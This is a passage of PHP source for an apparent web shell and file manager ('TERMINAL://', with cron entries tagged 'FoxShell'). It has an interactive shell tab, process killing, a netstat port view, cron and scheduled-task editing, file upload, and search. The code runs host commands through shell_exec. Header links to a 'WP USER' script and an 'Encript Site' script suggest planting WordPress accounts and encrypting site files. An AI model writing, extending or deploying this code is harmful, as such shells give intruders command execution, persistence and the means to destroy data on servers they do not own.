              if (str_contains($hay, $gneedle)) {
                $grepHits[] = ["line"=>$i+1, "text"=>$ln];
                if (count($grepHits) >= 6) break;
              }
            }
            if (empty($grepHits)) continue;
          }

          $searchResults[] = [
            "rel"=>$rel,
            "size" => (int)(@filesize($abs) ?: 0),
            "mtime" => (int)(@filemtime($abs) ?: 0),
            "snips" => $grepHits
          ];
          $hits++;
          if ($hits >= $MAX_SEARCH_HITS) { $searchInfo = "Hit cap reached."; break; }
        } catch (Exception $e) { continue; } catch (Error $e) { continue; }
      }
    } catch (Exception $e) {} catch (Error $e) {}
    if ($searchInfo === "") $searchInfo = "Scanned entries: ".min($entries, $MAX_SCAN_ENTRIES).", hits: ".count($searchResults).".";
  }
}

// ================== TRASH LIST ==================
$trashItems = [];
if ($tab === "trash") {
  $trashItems = list_dir($TRASH_ABS, $ROOT);
}

// ================== BACKUP LIST ==================
$backupItems = [];
if ($tab === "backups") {
  $backupItems = list_dir($BACKUP_ABS, $ROOT);
}

// ================== TAIL DATA ==================
$tailRel = normalize_rel((string)($_GET["tail"] ?? ""));
$tailAbs = $tailRel !== "" ? rel_to_abs($ROOT, $tailRel) : false;
$tailOut = "";
if ($tab === "tail" && $tailAbs && is_file($tailAbs)) {
  $n = (int)($_GET["n"] ?? 200);
  if ($n < 10) $n = 10;
  if ($n > 5000) $n = 5000;
  $tailOut = tail_file($tailAbs, $n);
}

// ================== DIFF VIEW ==================
$showDiff = isset($_GET["diff"]) && $_GET["diff"] === "1";
$diffMode = "";
$diffOut = "";
if ($showDiff && isset($_SESSION["last_diff"]) && is_array($_SESSION["last_diff"])) {
  $ld = $_SESSION["last_diff"];
  $before = (string)($ld["before"] ?? "");
  $after  = (string)($ld["after"] ?? "");
  [$mode, $out] = xdiff_or_side_by_side($before, $after);
  $diffMode = $mode;
  $diffOut = $out;
}

if (($_GET["partial"] ?? "") === "browserList") {
  $isHx = (($_SERVER["HTTP_HX_REQUEST"] ?? "") === "true");

  // Kalau user refresh / buka URL manual -> jangan tampil partial
  if (!$isHx) {
    $q = $_GET;
    unset($q["partial"]);
    $url = $_SERVER["PHP_SELF"] . (empty($q) ? "" : ("?" . http_build_query($q)));
    header("Location: ".$url);
    exit;
  }

  // HTMX request -> return partial
  render_browser_list($tab, $items, $trashItems, $backupItems, $csrf, $pathRel, $openRel, $TRASH_DIRNAME, $BACKUP_DIRNAME, $TMP_DIRNAME);
  exit;
}

// ================== UI (HTML) ==================
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?=h($APP_TITLE)?></title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/htmx.org@1.9.12"></script>

  <!-- IMPORTANT: SINGLE STYLE TAG, NO NESTED <style> -->
  <style>
    :root{
<?php foreach ($pal as $k=>$v): ?>
      <?=h($k)?>: <?=h($v)?>;
<?php endforeach; ?>
    }

    body{
      background:
        radial-gradient(1200px 600px at 20% 0%, var(--shadow), transparent 55%),
        radial-gradient(900px 500px at 90% 10%, color-mix(in srgb, var(--shadow) 70%, transparent), transparent 55%),
        var(--bg);
      color:var(--txt);
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono","Courier New", monospace;
    }

    .panel{background:var(--panel); border:1px solid var(--line); box-shadow:0 0 0 1px rgba(0,0,0,.7) inset, 0 0 50px var(--shadow);}
    .panel2{background:var(--panel2); border:1px solid var(--line2);}
    .tabbar{background:rgba(0,0,0,.18); border-bottom:1px solid var(--line);}
    .btn{border:1px solid var(--line); background:color-mix(in srgb, var(--acc) 12%, transparent);}
    .btn:hover{background:color-mix(in srgb, var(--acc) 18%, transparent);}
    .btnDanger{border:1px solid rgba(251,113,133,.35); background:rgba(251,113,133,.10);}
    .btnDanger:hover{background:rgba(251,113,133,.16);}
    .input{background:rgba(0,0,0,.18); border:1px solid var(--line); outline:none; color:var(--txt);}
    .input:focus{border-color:color-mix(in srgb, var(--acc) 60%, transparent); box-shadow:0 0 0 3px color-mix(in srgb, var(--acc) 18%, transparent);}
    .mono-scroll::-webkit-scrollbar{width:10px;height:10px}
    .mono-scroll::-webkit-scrollbar-thumb{background:color-mix(in srgb, var(--acc) 22%, transparent); border:2px solid rgba(0,0,0,.85); border-radius:10px}
    .mono-scroll::-webkit-scrollbar-track{background:rgba(0,0,0,.3)}
    .row:hover{background:color-mix(in srgb, var(--acc) 8%, transparent)}
    .sel{background:color-mix(in srgb, var(--acc) 14%, transparent); border-color:color-mix(in srgb, var(--acc) 25%, transparent)}
    .kbd{border:1px solid var(--line2); background:rgba(0,0,0,.45); padding:.15rem .45rem; border-radius:.5rem; font-size:.75rem; color:color-mix(in srgb, var(--txt) 85%, transparent)}
    .glowText{text-shadow:0 0 18px color-mix(in srgb, var(--acc) 22%, transparent);}
    .pillActive{background:color-mix(in srgb, var(--acc) 16%, transparent); border-color:color-mix(in srgb, var(--acc) 45%, transparent);}
    code, pre{white-space:pre; overflow:auto;}

    /* ============================
       THEME BRIDGE (IMPORTANT)
       Tailwind green/emerald -> CSS vars
       ============================ */
    .border-green-500\/20,
    .border-green-500\/15,
    .border-green-500\/10,
    .border-emerald-400\/60,
    .border-emerald-400\/40,
    .border-emerald-400\/30,
    .border-emerald-400\/25,
    .border-emerald-400\/20,
    .border-emerald-400\/15,
    .border-emerald-400\/10{
      border-color: color-mix(in srgb, var(--acc) 22%, transparent) !important;
    }

    .border-b.border-green-500\/20,
    .border-b.border-green-500\/15,
    .border-b.border-green-500\/10{
      border-bottom-color: color-mix(in srgb, var(--acc) 22%, transparent) !important;
    }

    .text-green-50,
    .text-green-100,
    .text-green-200,
    .text-emerald-100,
    .text-emerald-200,
    .text-emerald-300,
    .text-emerald-400{
      color: var(--txt) !important;
    }

    .bg-emerald-500\/25,
    .bg-emerald-500\/20,
    .bg-emerald-500\/15,
    .bg-emerald-500\/10{
      background-color: color-mix(in srgb, var(--acc) 18%, transparent) !important;
    }

    .accent-green-500{ accent-color: var(--acc) !important; }

    .hover\:text-green-200:hover,
    .hover\:text-green-100:hover,
    .hover\:text-emerald-200:hover{
      color: var(--txt) !important;
    }

    #contextMenu {
      display: none;
      position: absolute;
      z-index: 1000;
      min-width: 160px;
      background: var(--bg);
      border: 1px solid var(--line);
      border-radius: 12px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
      padding: 6px;
      backdrop-blur: 10px;
    }
    .ctx-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 8px 12px;
      font-size: 12px;
      color: var(--txt);
      cursor: pointer;
      border-radius: 8px;
      transition: all 0.2s;
    }
    .ctx-item:hover {
      background: color-mix(in srgb, var(--acc) 15%, transparent);
      color: var(--acc);
    }
    .ctx-sep {
      height: 1px;
      background: var(--line2);
      margin: 4px;
    }

    /* Toast Notifications */
    .toast-container {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .toast {
      padding: 12px 20px;
      border-radius: 12px;
      background: var(--panel);
      border: 1px solid var(--line);
      color: var(--txt);
      font-size: 13px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      backdrop-filter: blur(8px);
      animation: toastIn 0.3s ease-out;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .toast-success { border-left: 4px solid #10b981; }
    .toast-error { border-left: 4px solid #f43f5e; }
    
    @keyframes toastIn {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    .toast-fade { animation: toastOut 0.3s ease-in forwards; }
    @keyframes toastOut {
      from { transform: translateX(0); opacity: 1; }
      to { transform: translateX(100%); opacity: 0; }
    }

    /* Progress Modal */
    .progress-outer { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--line2); border-radius: 99px; overflow: hidden; height: 12px; }
    .progress-inner { height: 100%; background: linear-gradient(90deg, var(--acc), color-mix(in srgb, var(--acc) 60%, white)); width: 0%; transition: width 0.2s ease-out; }
  </style>
</head>


<body class="min-h-screen">
  <div class="toast-container" id="toastContainer"></div>
  <?php
  $__flash = $_SESSION["flash_msg"] ?? null;
  if ($__flash) unset($_SESSION["flash_msg"]);
  ?>
  <div class="tabbar px-4 py-2 flex items-center gap-3">
    <div class="text-sm font-semibold glowText">TERMINAL://</div>
    <div class="text-xs opacity-80">cwd: <?=h($cwdLabel)?></div>
    <div class="ml-auto flex items-center gap-2">
      <button type="button" class="btn rounded-lg px-3 py-1.5 text-xs" onclick="openThemes()">THEMES</button>
      <a class="btn rounded-lg px-3 py-1.5 text-xs" href="?phpinfo=1">PHP INFO</a>
      <a class="btn rounded-lg px-3 py-1.5 text-xs" href="?script=WpUser">WP USER</a>
      <a class="btn rounded-lg px-3 py-1.5 text-xs" href="?script=Encript">Encript Site</a>
      <form method="post">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <button class="btn rounded-lg px-3 py-1.5 text-xs" name="do_logout" value="1">Logout</button>
      </form>
    </div>
  </div>

  <!-- Tabs -->
  <div class="px-4 pt-4">
    <?php
      $tabs = [
        "files" => "FILES",
        "search" => "SEARCH",
        "trash" => "TRASH",
        "shell" => "SHELL",
        "tail" => "TAIL",
        "backups" => "BACKUPS",
        "diag" => "DIAG",
        "process" => "PROCESS",
        "ports" => "PORTS",
        "cron" => "CRON",
        "fim" => "FIM",
      ];
    ?>
    <div class="flex flex-wrap gap-2">
      <?php foreach($tabs as $k=>$label): ?>
        <a class="btn rounded-lg px-3 py-1.5 text-xs <?= $tab===$k ? "pillActive" : "" ?>"
           href="?<?=h(http_build_query(["path"=>$pathRel,"tab"=>$k]))?>"><?=h($label)?></a>
      <?php endforeach; ?>
      <form method="post" class="ml-auto">
        <input type="hidden" name="csrf" value="<?=h($csrf)?>">
        <input type="hidden" name="action" value="export_audit">
        <button class="btn rounded-lg px-3 py-1.5 text-xs">EXPORT_AUDIT</button>
      </form>
    </div>
  </div>

  <div id="main-app-content" class="p-4 grid grid-cols-12 gap-4">
    <!-- Left: Browser / Lists -->
    <div class="col-span-12 lg:col-span-4 panel rounded-xl overflow-hidden">
      <div class="px-3 py-2 border-b border-green-500/20 flex items-center gap-2">
        <div class="text-sm font-semibold glowText">
          <?= $tab==="trash" ? "TRASH_BROWSER" : ($tab==="backups" ? "BACKUP_BROWSER" : "PROJECT_BROWSER") ?>
        </div>
        <div class="ml-auto text-xs opacity-70">ROOT-JAIL</div>
      </div>

      <div class="p-3 flex items-center justify-between gap-1 border-b border-green-500/10 bg-black/10">
        <div class="flex items-center gap-1.5">
          <?php if ($pathRel !== "" && $tab === "files"): ?>
            <a class="btn rounded-lg px-2 py-2 text-xs hover:bg-green-500/10 transition-colors" href="?<?=h(http_build_query(["path"=>parent_rel($pathRel),"tab"=>"files"]))?>" title="Go Up">
              <?= get_icon('back', 'w-4 h-4') ?>
            </a>
          <?php endif; ?>
          
          <div class="flex items-center gap-0.5 bg-black/20 p-1 rounded-xl border border-white/5">
            <button class="p-2 hover:bg-green-500/20 rounded-lg transition-all group" onclick="openCreateFolder()" title="Create Folder">
              <span class="opacity-70 group-hover:opacity-100 group-hover:scale-110 block transition-transform"><?= get_icon('folder', 'w-4 h-4') ?></span>
            </button>
            <button class="p-2 hover:bg-green-500/20 rounded-lg transition-all group" onclick="openCreateFile()" title="Create File">
              <span class="opacity-70 group-hover:opacity-100 group-hover:scale-110 block transition-transform"><?= get_icon('file', 'w-4 h-4') ?></span>
            </button>
            <div class="w-px h-4 bg-white/10 mx-1"></div>
            <button class="p-2 hover:bg-green-500/20 rounded-lg transition-all group" onclick="triggerFileUpload()" title="Upload Files">
              <span class="opacity-70 group-hover:opacity-100 group-hover:scale-110 block transition-transform"><?= get_icon('upload', 'w-4 h-4') ?></span>
            </button>
            <button class="p-2 hover:bg-green-500/20 rounded-lg transition-all group" onclick="triggerFolderUpload()" title="Upload Folder">
              <span class="opacity-70 group-hover:opacity-100 group-hover:scale-110 block text-green-400 transition-transform"><?= get_icon('upload', 'w-4 h-4') ?></span>
            </button>
          </div>
        </div>

        <button class="btn rounded-xl p-2 text-xs flex items-center gap-2 border-emerald-400/20 hover:bg-emerald-500/10 transition-all" onclick="openThemes()" title="Themes">
          <?= get_icon('rename', 'w-4 h-4 opacity-70') ?>
        </button>
      </div>

      <?php /* upload form is rendered inside the files tab below */ ?>

      <?php if ($tab === "files"): ?>
        <div class="p-4 space-y-4">
          <div class="panel2 rounded-xl p-3">
            <div class="text-[11px] opacity-70 mb-3 flex items-center gap-2">
              <span class="text-green-400"><?= get_icon('search', 'w-3 h-3') ?></span> SMART_LOCATE
            </div>
            <form method="get" class="flex gap-2">
              <input type="hidden" name="tab" value="search">
              <input class="input flex-1 rounded-lg px-3 py-2 text-xs" name="q" placeholder="search files..." value="<?=h($searchQuery ?? '')?>">
              <button class="btn rounded-lg px-3 py-2 text-xs"><?= get_icon('search', 'w-3.5 h-3.5') ?></button>
            </form>
          </div>

          <!-- Hidden inputs for custom upload triggers -->
          <form method="post" enctype="multipart/form-data" id="uploadForm" class="hidden">
            <input type="hidden" name="csrf" value="<?=h($csrf)?>">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="up[]" id="fileInput" multiple onchange="handleFileSelection(this)">
            <input type="file" name="up[]" id="folderInput" webkitdirectory mozdirectory msdirectory odirectory directory onchange="handleFileSelection(this)">
          </form>
        </div>
      <?php endif; ?>

      <div class="border-t border-green-500/20"></div>

      <div id="browserList" class="mono-scroll max-h-[70vh] overflow-auto">
  <?php render_browser_list($tab, $items, $trashItems, $backupItems, $csrf, $pathRel, $openRel, $TRASH_DIRNAME, $BACKUP_DIRNAME, $TMP_DIRNAME); ?>
</div>
    </div>

    <!-- Middle: Main panel depends on tab -->
    <div class="col-span-12 lg:col-span-5 panel rounded-xl overflow-hidden">
      <div class="px-3 py-2 border-b border-green-500/20 flex items-center gap-2">
        <div class="text-sm font-semibold glowText">
          <?php
            echo match($tab) {
              "search" => "SEARCH_ENGINE",
              "tail" => "TAIL_VIEW",
              "trash" => "TRASH_ACTIONS",
              "backups" => "BACKUP_ACTIONS",
              "diag" => "DIAGNOSTICS",
              "shell" => "INTERACTIVE_SHELL",
              default => "FILE_VIEW",
            };
          ?>
        </div>
        <div class="ml-auto text-xs opacity-80">
          <span class="kbd">files: <?=h((string)$totals["files"])?></span>
          <span class="kbd">dirs: <?=h((string)$totals["dirs"])?></span>
          <span class="kbd">bytes: <?=h(fmt_bytes((int)$totals["bytes"]))?></span>
        </div>
      </div>

      <div class="p-3">
        <?php if ($tab === "search"): ?>
          <?php
            $sp = $_SESSION["search_params"] ?? ["q"=>"","grep"=>"","case"=>false,"ext"=>"","in"=>""];
          ?>
          <div class="panel2 rounded-xl p-3 mb-3">
            <form method="post" class="grid grid-cols-1 gap-2">
              <input type="hidden" name="csrf" value="<?=h($csrf)?>">
              <input type="hidden" name="action" value="do_search">
              <div class="grid grid-cols-2 gap-2">
                <input class="input rounded-lg px-3 py-2 text-xs" name="q" placeholder="name contains (optional)" value="<?=h((string)$sp["q"])?>">
                <input class="input rounded-lg px-3 py-2 text-xs" name="grep" placeholder="grep contains (optional)" value="<?=h((string)$sp["grep"])?>">
              </div>
              <div class="grid grid-cols-2 gap-2">
                <input class="input rounded-lg px-3 py-2 text-xs" name="ext" placeholder="ext filter: log,txt,php (optional)" value="<?=h((string)$sp["ext"])?>">
                <input class="input rounded-lg px-3 py-2 text-xs" name="in" placeholder="in dir rel (optional, default root)" value="<?=h((string)$sp["in"])?>">
              </div>
              <label class="text-[11px] opacity-80 flex items-center gap-2">
                <input type="checkbox" name="case" value="1" <?= !empty($sp["case"]) ? "checked" : "" ?>>
                Case sensitive
              </label>
              <button class="btn rounded-lg px-3 py-2 text-xs">RUN_SEARCH</button>
              <div class="text-[11px] opacity-70">
                Notes: binary skipped • per-file grep capped at <?=h(fmt_bytes($MAX_GREP_BYTES_PER_FILE))?> • results capped at <?=h((string)$MAX_SEARCH_HITS)?>
              </div>
            </form>
          </div>

          <div class="panel2 rounded-xl p-3">
            <div class="text-xs opacity-80 mb-2 glowText">RESULTS</div>
            <div class="text-[11px] opacity-70 mb-2"><?=h($searchInfo ?: "No query yet.")?></div>
            <div class="mono-scroll max-h-[62vh] overflow-auto text-[11px] space-y-3">
              <?php if (empty($searchResults)): ?>
                <div class="opacity-70">No results.</div>
              <?php else: ?>
                <?php foreach($searchResults as $r): ?>
                  <div class="border border-green-500/15 rounded-lg p-2 bg-black/20">
                    <div class="flex items-center justify-between gap-2">
                      <a class="underline hover:text-green-200 break-all"
                         href="?<?=h(http_build_query(["path"=>normalize_rel(dirname($r["rel"])==="."?"":dirname($r["rel"])),"tab"=>"files","open"=>$r["rel"]]))?>">
                        <?=h("/".$r["rel"])?>
                      </a>
                      <div class="opacity-70"><?=h(fmt_bytes((int)$r["size"]))?> • <?=h(date("Y-m-d H:i",(int)$r["mtime"]))?></div>
                    </div>
                    <?php if (!empty($r["snips"])): ?>
                      <div class="mt-2 space-y-1">
                        <?php foreach($r["snips"] as $s): ?>
                          <div class="opacity-90">
                            <span class="kbd">L<?=h((string)$s["line"])?></span>
                            <span class="break-all"><?=h((string)$s["text"])?></span>
                          </div>
                        <?php endforeach; ?>
                      </div>
                    <?php endif; ?>
                  </div>
                <?php endforeach; ?>
              <?php endif; ?>
            </div>
          </div>

        <?php elseif ($tab === "tail"): ?>
          <div class="panel2 rounded-xl p-3 mb-3">
            <form method="get" class="grid grid-cols-1 gap-2">
              <input type="hidden" name="tab" value="tail">
              <input type="hidden" name="path" value="<?=h($pathRel)?>">
              <input class="input rounded-lg px-3 py-2 text-xs" name="tail" placeholder="file rel path to tail (e.g. logs/app.log)" value="<?=h($tailRel)?>">
              <div class="grid grid-cols-3 gap-2">
                <input class="input rounded-lg px-3 py-2 text-xs" name="n" placeholder="lines (e.g. 200)" value="<?=h((string)($_GET["n"] ?? 200))?>">
                <input class="input rounded-lg px-3 py-2 text-xs" id="autoref" placeholder="auto ms (e.g. 2000)" value="<?=h((string)($_GET["auto"] ?? ""))?>">
                <button class="btn rounded-lg px-3 py-2 text-xs">TAIL</button>
              </div>
              <div class="text-[11px] opacity-70">Auto refresh: set "auto ms" and press ENABLE below.</div>
            </form>
            <div class="mt-2 flex gap-2">
              <button class="btn rounded-lg px-3 py-2 text-xs" onclick="enableAuto()">ENABLE_AUTO</button>
              <button class="btnDanger rounded-lg px-3 py-2 text-xs" onclick="disableAuto()">DISABLE_AUTO</button>
            </div>
          </div>

          <div class="panel2 rounded-xl p-3">
            <div class="text-xs opacity-80 mb-2 glowText">TAIL_OUTPUT</div>
            <pre class="mono-scroll input rounded-xl p-3 text-[11px] leading-relaxed min-h-[62vh]"><?=h($tailOut ?: "No output.")?></pre>
          </div>

        <?php elseif ($tab === "trash"): ?>
          <div class="panel2 rounded-xl p-3">
            <div class="text-xs opacity-80 mb-3 glowText">TRASH_ACTIONS</div>

            <form method="post" class="space-y-2">
              <input type="hidden" name="csrf" value="<?=h($csrf)?>">
              <input type="hidden" name="action" value="trash_restore">
              <input class="input w-full rounded-lg px-3 py-2 text-xs" name="trashrel" placeholder="trash item rel (from left list)">
              <div class="grid grid-cols-2 gap-2">
                <input class="input rounded-lg px-3 py-2 text-xs" name="restore_to" placeholder="restore to dir rel (empty=root)">
                <button class="btn rounded-lg px-3 py-2 text-xs">RESTORE</button>
              </div>
              <div class="text-[11px] opacity-70">Tip: copy rel path from left list.</div>
            </form>

            <form method="post" class="space-y-2 mt-4">
              <input type="hidden" name="csrf" value="<?=h($csrf)?>">
              <input type="hidden" name="action" value="trash_purge">
              <input class="input w-full rounded-lg px-3 py-2 text-xs" name="trashrel" placeholder="trash item rel to purge permanently">
              <button class="btnDanger rounded-lg px-3 py-2 text-xs w-full">PURGE_PERMANENT</button>
            </form>
          </div>

        <?php elseif ($tab === "backups"): ?>
          <div class="panel2 rounded-xl p-3">
            <div class="text-xs opacity-80 mb-3 glowText">BACKUP_ACTIONS</div>

            <form method="post" class="space-y-2">
              <input type="hidden" name="csrf" value="<?=h($csrf)?>">
              <input type="hidden" name="action" value="backup_restore">
              <input class="input w-full rounded-lg px-3 py-2 text-xs" name="backuprel" placeholder="backup rel (from left list)">
              <input class="input w-full rounded-lg px-3 py-2 text-xs" name="targetrel" placeholder="target file rel to restore into">
              <button class="btn rounded-lg px-3 py-2 text-xs w-full">RESTORE_BACKUP</button>
              <div class="text-[11px] opacity-70">Backup restore copies backup -> target file.</div>
            </form>
          </div>

        <?php elseif ($tab === "process"): ?>
          <div class="panel2 rounded-xl p-3">
              <div class="text-xs opacity-80 mb-3 glowText">PROCESS_LIST (TOP/TASKLIST)</div>
              <div class="mono-scroll max-h-[70vh] overflow-auto text-[11px]">
                <table class="w-full text-left">
                  <thead class="sticky top-0 bg-black/40 backdrop-blur">
                    <tr>
                      <th class="py-1 px-2 border-b border-white/10">NAME</th>
                      <th class="py-1 px-2 border-b border-white/10">PID</th>
                      <?php if ($IS_WINDOWS): ?>
                      <th class="py-1 px-2 border-b border-white/10">MEM</th>
                      <?php endif; ?>
                      <th class="py-1 px-2 border-b border-white/10">ACTION</th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php
                      if ($IS_WINDOWS) {
                        $out = shell_exec("tasklist /NH /FO CSV");
                        $lines = explode("\n", (string)$out);
                        foreach ($lines as $ln) {
                          $cols = str_getcsv($ln);
                          if (count($cols) < 2) continue;
                          ?>
                          <tr class="hover:bg-white/5">
                            <td class="py-1 px-2"><?= h($cols[0]) ?></td>
                            <td class="py-1 px-2"><?= h($cols[1]) ?></td>
                            <td class="py-1 px-2"><?= h($cols[4]) ?></td>
                            <td class="py-1 px-2">
                              <form method="post">
                                <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                                <input type="hidden" name="action" value="kill_process">
                                <input type="hidden" name="pid" value="<?= h($cols[1]) ?>">
                                <button type="button" class="text-red-400 hover:text-red-300" onclick="const f=this.form; openConfirm('KILL_PROCESS', 'Kill PID <?= h($cols[1]) ?>?', ()=>f.submit())">KILL</button>
                              </form>
                            </td>
                          </tr>
                          <?php
                        }
                      } else {
                        $out = shell_exec("ps axo comm,pid,rss --no-headers");
                        $lines = explode("\n", trim((string)$out));
                        foreach ($lines as $ln) {
                          $cols = preg_split('/\s+/', trim($ln));
                          if (count($cols) < 2) continue;
                          ?>
                          <tr class="hover:bg-white/5">
                            <td class="py-1 px-2"><?= h($cols[0]) ?></td>
                            <td class="py-1 px-2"><?= h($cols[1]) ?></td>
                            <td class="py-1 px-2">
                              <form method="post" onsubmit="return false;">
                                <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                                <input type="hidden" name="action" value="kill_process">
                                <input type="hidden" name="pid" value="<?= h($cols[1]) ?>">
                                <button type="button" class="text-red-400 hover:text-red-300" onclick="const f=this.closest('form'); openConfirm('KILL_PROCESS','Kill PID <?= h($cols[1]) ?>?',()=>{f.onsubmit=null;f.submit()});">KILL</button>
                              </form>
                            </td>
                          </tr>
                          <?php
                        }
                      }
                    ?>
                  </tbody>
                </table>
              </div>
            </div>

        <?php elseif ($tab === "ports"): ?>
          <div class="panel2 rounded-xl p-3">
              <div class="text-xs opacity-80 mb-2 glowText">PORT_SCAN (LISTENING)</div>
              <pre class="mono-scroll max-h-[70vh] overflow-auto text-[10px] opacity-80"><?php
                  if ($IS_WINDOWS) {
                      echo h(shell_exec("netstat -ano | findstr LISTENING"));
                  } else {
                      echo h(shell_exec("netstat -plnt"));
                  }
              ?></pre>
            </div>

        <?php elseif ($tab === "cron"): ?>
          <div class="panel2 rounded-xl p-3">
            <div class="flex items-center justify-between mb-3">
              <div class="text-xs opacity-80 glowText">CRON / SCHEDULED_TASKS</div>
              <button class="btn rounded-lg px-3 py-1 text-[10px]" onclick="openCron()">+ ADD TASK</button>
            </div>
            <div class="mono-scroll max-h-[70vh] overflow-auto text-[11px]">
              <table class="w-full text-left">
                <thead class="sticky top-0 bg-black/40 backdrop-blur">
                  <tr>
                    <th class="py-1 px-2 border-b border-white/10">TASK_NAME</th>
                    <th class="py-1 px-2 border-b border-white/10">COMMAND</th>
                    <th class="py-1 px-2 border-b border-white/10">SCHEDULE</th>
                    <th class="py-1 px-2 border-b border-white/10">ACTION</th>
                  </tr>
                </thead>
                <tbody>
                  <?php
                    if ($IS_WINDOWS) {
                      // schtasks /query /fo csv /v
                      $out = shell_exec("schtasks /query /fo csv /v 2>nul");
                      $lines = explode("\n", (string)$out);
                      $headers = [];
                      foreach ($lines as $ln) {
                        $cols = str_getcsv($ln);
                        if (count($cols) < 2) continue;
                        if (empty($headers)) { $headers = $cols; continue; }
                        
                        // Map important columns
                        $name = $cols[1] ?? ""; // TaskName
                        $cmd  = $cols[8] ?? ""; // Task To Run
                        $sc   = $cols[11] ?? ""; // Schedule Type
                        
                        if ($name === "" || str_starts_with($name, "\\Microsoft\\")) continue;
                        ?>
                        <tr class="hover:bg-white/5">
                          <td class="py-1 px-2"><?= h($name) ?></td>
                          <td class="py-1 px-2 truncate max-w-[200px]" title="<?= h($cmd) ?>"><?= h($cmd) ?></td>
                          <td class="py-1 px-2"><?= h($sc) ?></td>
                          <td class="py-1 px-2 flex gap-2">
                            <button class="text-emerald-400 hover:text-emerald-300" 
                                    onclick="openCron('<?=h(addslashes($name))?>','<?=h(addslashes($cmd))?>')">EDIT</button>
                            <form method="post" onsubmit="return confirm('Delete task?')">
                              <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                              <input type="hidden" name="action" value="cron_delete">
                              <input type="hidden" name="name" value="<?= h($name) ?>">
                              <button class="text-red-400 hover:text-red-300">DEL</button>
                            </form>
                          </td>
                        </tr>
                        <?php
                      }
                    } else {
                      $out = shell_exec("crontab -l 2>/dev/null") ?? "";
                      $lines = explode("\n", trim($out));
                      foreach ($lines as $ln) {
                        if (trim($ln) === "" || str_starts_with(trim($ln), "#") && !str_contains($ln, "FoxShell:")) continue;
                        
                        $name = "Custom";
                        $cmd = $ln;
                        if (preg_match('/# FoxShell:(.*)/', $ln, $m)) {
                            $name = trim($m[1]);
                            $cmd = trim(explode("#", $ln)[0]);
                        }
                        ?>
                        <tr class="hover:bg-white/5">
                          <td class="py-1 px-2"><?= h($name) ?></td>
                          <td class="py-1 px-2 truncate max-w-[200px]"><?= h($cmd) ?></td>
                          <td class="py-1 px-2">Managed</td>
                          <td class="py-1 px-2 flex gap-2">
                            <button class="text-emerald-400 hover:text-emerald-300" onclick="openCron('<?=h(addslashes($name))?>','<?=h(addslashes($cmd))?>')">EDIT</button>
                            <form method="post">
                              <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                              <input type="hidden" name="action" value="cron_delete">
                              <input type="hidden" name="name" value="<?= h($name) ?>">
                              <button type="button" class="text-red-400 hover:text-red-300" onclick="const f=this.form; openConfirm('DELETE_CRON', 'Delete cron task?', ()=>f.submit())">DEL</button>
                            </form>
                          </td>
                        </tr>
                        <?php
                      }
                    }
                  ?>
                </tbody>
              </table>
            </div>
          </div>

        <?php elseif ($tab === "fim"): ?>
          <div class="panel2 rounded-xl p-3">
            <div class="text-xs opacity-80 mb-2 glowText">FIM (FILE_INTEGRITY)</div>
            <div class="text-[11px] mb-2">
              <form method="post">
                <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                <input type="hidden" name="action" value="fim_baseline">
                <button class="btn rounded-lg px-3 py-1 text-[10px]">REBUILD BASELINE</button>
              </form>
            </div>
            <div class="space-y-1 text-[10px]">
              <?php
                $baseline = $_SESSION["fim_baseline"] ?? [];
                if (empty($baseline)) echo "<div class='opacity-70'>No baseline set.</div>";
                else {
                  foreach ($baseline as $file => $oldHash) {
                    $current = file_exists($file) ? hash_file("sha256", $file) : "DELETED";
                    $ok = ($current === $oldHash);
                    ?>
                    <div class="flex justify-between items-center gap-2 border-b border-white/5 pb-1">
                      <span class="truncate opacity-70"><?= h(basename($file)) ?></span>
                      <span class="<?= $ok ? 'text-green-400' : 'text-red-400' ?> font-semibold">
                        <?= $ok ? "OK" : "CHANGED" ?>
                      </span>
                    </div>
                    <?php
                  }
                }
              ?>
            </div>
          </div>

        <?php elseif ($tab === "shell"): ?>
          <?php
            if (!isset($_SESSION["shell"])) {
                $_SESSION["shell"] = ["cwd" => $ROOT, "history" => []];
            }
            $sh = $_SESSION["shell"];
          ?>
          <div class="panel2 rounded-xl h-[75vh] flex flex-col overflow-hidden border-emerald-500/30">
            <div class="px-3 py-2 bg-black/40 border-b border-emerald-500/20 flex items-center justify-between">
              <div class="flex items-center gap-3">
                <div class="text-[10px] font-bold text-emerald-400">INTERACTIVE_SHELL</div>
                <form method="post">
                    <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
                    <input type="hidden" name="action" value="shell_clear">
                    <button type="button" class="text-[9px] text-red-500/70 hover:text-red-400 font-bold uppercase tracking-tighter transition-colors"
                            onclick="const f=this.form; openConfirm('CLEAR_SHELL', 'Clear shell history?', ()=>f.submit())">CLEAR</button>
                </form>
              </div>
              <div class="text-[9px] opacity-60 font-mono"><?= h($sh["cwd"]) ?></div>
            </div>
            
            <div id="shellOutput" class="flex-1 overflow-auto p-4 font-mono text-[12px] space-y-4 mono-scroll bg-black/20">
              <?php if (empty($sh["history"])): ?>
                <div class="opacity-40 italic">Terminal ready. Type a command below...</div>
              <?php else: ?>
                <?php foreach ($sh["history"] as $entry): ?>
                  <div class="space-y-1">
                    <div class="flex items-center gap-2">
                        <span class="text-emerald-500 font-bold">➜</span>
                        <span class="text-emerald-300/70 truncate text-[10px]">[<?= h(abs_to_rel($ROOT, $entry["cwd"]) ?: "/") ?>]</span>
                        <span class="text-emerald-100"><?= h($entry["cmd"]) ?></span>
                    </div>
